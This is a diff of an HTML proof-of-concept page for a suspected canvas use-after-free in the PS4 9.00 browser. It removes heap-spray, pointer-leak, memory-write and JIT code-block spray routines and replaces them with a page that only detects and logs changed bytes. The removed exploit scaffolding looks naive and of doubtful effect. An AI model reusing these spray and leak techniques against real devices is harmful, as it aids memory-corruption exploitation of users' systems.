@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canvas UAF Exploit PoC (PS4 9.00)</title>
+    <title>Canvas UAF  PoC (PS4/ ps5?)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -16,47 +16,41 @@
             font-weight: bold;
             color: darkred;
         }
+        #console {
+            margin-top: 10px;
+            white-space: pre-wrap;
+            font-family: monospace;
+        }
         #canvas {
             display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Canvas UAF Exploit PoC (PS4 9.00)</h1>
-    <p>Click to trigger the exploit. Expect crash, leak, or memory write.</p>
-    <button id="trigger">Trigger Exploit</button>
+    <h1>Canvas UAF  PoC</h1>
+    <p>Click to detect UAF. Outputs changed offsets and values.</p>
+    <button id="trigger">Detect UAF</button>
     <div id="status">Idle...</div>
+    <div id="console"></div>
     <canvas id="canvas" width="512" height="512"></canvas>
     <script>
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const status = document.getElementById('status');
+        const consoleDiv = document.getElementById('console');
         let attemptCount = 0;
+
+        function log(msg) {
+            consoleDiv.append(msg + '\n');
+        }
 
         function stressGC() {
             for (let i = 0; i < 500; i++) {
-                new ArrayBuffer(1024 * 1024);
+                new ArrayBuffer(1024 * 1024); // 1MB
             }
             for (let i = 0; i < 100; i++) {
-                new ArrayBuffer(2 * 1024 * 1024);
+                new ArrayBuffer(2 * 1024 * 1024); // 2MB
             }
-        }
-
-        function sprayHeap() {
-            const arrays = [];
-            const targetSize = 512 * 512 * 4; // ImageData size
-            for (let i = 0; i < 20000; i++) {
-                const buf = new ArrayBuffer(targetSize);
-                const view = new Uint32Array(buf);
-                for (let j = 0; j < view.length; j += 4) {
-                    view[j] = 0x41424344; // ABCD
-                    view[j + 1] = 0x12345678; // Fake ptr low
-                    view[j + 2] = 0x87654321; // Fake ptr high
-                    view[j + 3] = i; // Index
-                }
-                arrays.push({ buffer: buf, view: new Uint8Array(buf) });
-            }
-            return arrays;
         }
 
         function drawOnCanvas() {
@@ -73,148 +67,102 @@
         }
 
         function checkImageDataUAF(imageData) {
-            const original = new Uint8Array(imageData.data);
+            const original = new Uint8Array(imageData.data.buffer);
+            const originalCopy = new Uint8Array(original); // Save original state
             ctx.putImageData(imageData, 0, 0);
             try {
-                const current = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+                const current = new Uint8Array(ctx.getImageData(0, 0, canvas.width, canvas.height).data.buffer);
+                const differences = [];
                 for (let i = 0; i < original.length; i++) {
-                    if (original[i] !== current[i]) {
-                        return { detected: true, data: current };
+                    if (originalCopy[i] !== current[i]) {
+                        differences.push({
+                            offset: i,
+                            original: originalCopy[i],
+                            newValue: current[i]
+                        });
                     }
                 }
+                return { detected: differences.length > 0, differences };
             } catch (e) {
-                return { detected: true, data: null };
+                return { detected: true, differences: [], error: e.message };
             }
-            return { detected: false, data: null };
         }
 
-        function attemptMemoryLeak(imageData) {
-            const result = checkImageDataUAF(imageData);
-            if (result.detected && result.data) {
-                let leaked = '';
-                const view = new Uint32Array(result.data.buffer);
-                for (let i = 0; i < view.length && i < 64; i += 4) {
-                    if (view[i] === 0x41424344) {
-                        leaked += `Leaked at offset ${i * 4}: ABCD pattern\n`;
-                        leaked += `Ptr: 0x${view[i + 1].toString(16)} 0x${view[i + 2].toString(16)}\n`;
-                        leaked += `Buffer index: ${view[i + 3]}\n`;
-                        if (view[i + 1] !== 0x12345678 || view[i + 2] !== 0x87654321) {
-                            leaked += `Real ptr: 0x${view[i + 2].toString(16)}${view[i + 1].toString(16)}\n`;
-                        }
-                    }
-                }
-                return leaked || 'UAF detected but no clear leak';
-            }
-            return null;
-        }
-
-        function attemptMemoryWrite(imageData, sprayed) {
-            const newData = new Uint8Array(imageData.data.length);
-            const fakePtr = [0x11223344, 0x55667788]; // Test pointer
-            for (let i = 0; i < newData.length; i += 16) {
-                newData[i] = 0x99; newData[i + 1] = 0x99;
-                newData.set(new Uint8Array(new Uint32Array(fakePtr).buffer), i + 4);
-            }
-            imageData.data.set(newData);
-            ctx.putImageData(imageData, 0, 0);
-            for (let i = 0; i < sprayed.length; i++) {
-                const view = sprayed[i].view;
-                if (view[0] === 0x99 && view[1] === 0x99) {
-                    const ptrView = new Uint32Array(sprayed[i].buffer, 4, 2);
-                    return `Memory write detected! Wrote ptr: 0x${ptrView[0].toString(16)} 0x${ptrView[1].toString(16)}`;
-                }
-            }
-            return null;
-        }
-
-        function createCodeBlock() {
-            const funcs = [];
-            const consLen = 512 * 512 * 4 - 8 * 5; // Match ImageData size
-            let src = 'var f = 0x11223344;\n';
-            for (let i = 0; i < consLen; i += 8) {
-                src += `var a${i} = ${100 + i};\n`;
-            }
-            src += 'return [];\n';
-            for (let i = 0; i < 100; i++) {
-                const f = new Function(src);
-                f();
-                funcs.push(f);
-            }
-            return funcs;
-        }
-
-        function triggerExploit() {
+        async function detectUAF() {
             attemptCount++;
             status.textContent = `Attempt ${attemptCount} in progress...`;
+            log(`Attempt ${attemptCount} started`);
 
             try {
                 // Create reference ImageData
                 const refImageData = ctx.createImageData(512, 512);
-                for (let i = 0; i < refImageData.data.length; i++) {
-                    refImageData.data[i] = 0x46;
+                const refView = new Uint8Array(refImageData.data.buffer);
+                for (let i = 0; i < refView.length; i++) {
+                    refView[i] = 0x46; // Fill with known value
                 }
 
-                // Create CodeBlock (inspired by PSFree)
-                const funcs = createCodeBlock();
-
-                // Spray heap
-                const sprayed = sprayHeap();
-
-                // Intensive drawing
+                // Intensive drawing to trigger UAF
                 const drawInterval = setInterval(drawOnCanvas, 1);
 
-                // Check for UAF and attempt exploit
-                setTimeout(() => {
-                    // First UAF check
-                    const uafResult = checkImageDataUAF(refImageData);
-                    if (uafResult.detected) {
-                        status.textContent = 'ImageData UAF detected!';
-                        // Attempt memory leak
-                        const leaked = attemptMemoryLeak(refImageData);
-                        if (leaked) {
-                            status.textContent += `\nMemory Leak:\n${leaked}`;
-                            // Attempt memory write
-                            const writeResult = attemptMemoryWrite(refImageData, sprayed);
-                            if (writeResult) {
-                                status.textContent += `\n${writeResult}`;
-                            }
-                        }
-                        clearInterval(drawInterval);
-                        return;
-                    }
-
-                    stressGC();
-
-                    // Second UAF check
-                    if (checkImageDataUAF(refImageData).detected) {
-                        status.textContent = 'ImageData UAF detected after GC!';
-                        const leaked = attemptMemoryLeak(refImageData);
-                        if (leaked) {
-                            status.textContent += `\nMemory Leak:\n${leaked}`;
-                            const writeResult = attemptMemoryWrite(refImageData, sprayed);
-                            if (writeResult) {
-                                status.textContent += `\n${writeResult}`;
-                            }
-                        }
-                        clearInterval(drawInterval);
-                        return;
-                    }
-
-                    status.textContent = 'Exploit attempted!';
+                // Check for UAF
+                setTimeout(async () => {
+                    const result = checkImageDataUAF(refImageData);
                     clearInterval(drawInterval);
+
+                    if (result.detected) {
+                        status.textContent = 'UAF detected!';
+                        log('UAF detected!');
+                        if (result.error) {
+                            status.textContent += `\nError: ${result.error}`;
+                            log(`Error: ${result.error}`);
+                        } else if (result.differences.length > 0) {
+                            status.textContent += `\nFound ${result.differences.length} differences`;
+                            log(`Found ${result.differences.length} differences:`);
+                            for (const diff of result.differences) {
+                                log(`Offset: ${diff.offset}, Original: 0x${diff.original.toString(16).padStart(2, '0')}, New: 0x${diff.newValue.toString(16).padStart(2, '0')}`);
+                            }
+                        } else {
+                            status.textContent += '\nNo specific differences found, but UAF occurred';
+                            log('No specific differences found, but UAF occurred');
+                        }
+                    } else {
+                        stressGC();
+                        await new Promise(resolve => setTimeout(resolve, 10));
+                        const secondResult = checkImageDataUAF(refImageData);
+                        if (secondResult.detected) {
+                            status.textContent = 'UAF detected after GC!';
+                            log('UAF detected after GC!');
+                            if (secondResult.error) {
+                                status.textContent += `\nError: ${secondResult.error}`;
+                                log(`Error: ${secondResult.error}`);
+                            } else if (secondResult.differences.length > 0) {
+                                status.textContent += `\nFound ${secondResult.differences.length} differences`;
+                                log(`Found ${secondResult.differences.length} differences:`);
+                                for (const diff of secondResult.differences) {
+                                    log(`Offset: ${diff.offset}, Original: 0x${diff.original.toString(16).padStart(2, '0')}, New: 0x${diff.newValue.toString(16).padStart(2, '0')}`);
+                                }
+                            } else {
+                                status.textContent += '\nNo specific differences found, but UAF occurred';
+                                log('No specific differences found, but UAF occurred');
+                            }
+                        } else {
+                            status.textContent = 'No UAF detected';
+                            log('No UAF detected');
+                        }
+                    }
                 }, 100);
             } catch (err) {
-                console.error(`Error: ${err.message}`);
                 status.textContent = `Failed: ${err.message}`;
+                log(`Error: ${err.message}`);
             }
         }
 
-        document.getElementById('trigger').addEventListener('click', () => {
+        document.getElementById('trigger').addEventListener('click', async () => {
             try {
-                triggerExploit();
+                await detectUAF();
             } catch (err) {
-                console.error(`Error: ${err.message}`);
                 status.textContent = `Failed: ${err.message}`;
+                log(`Error: ${err.message}`);
             }
         });
     </script>
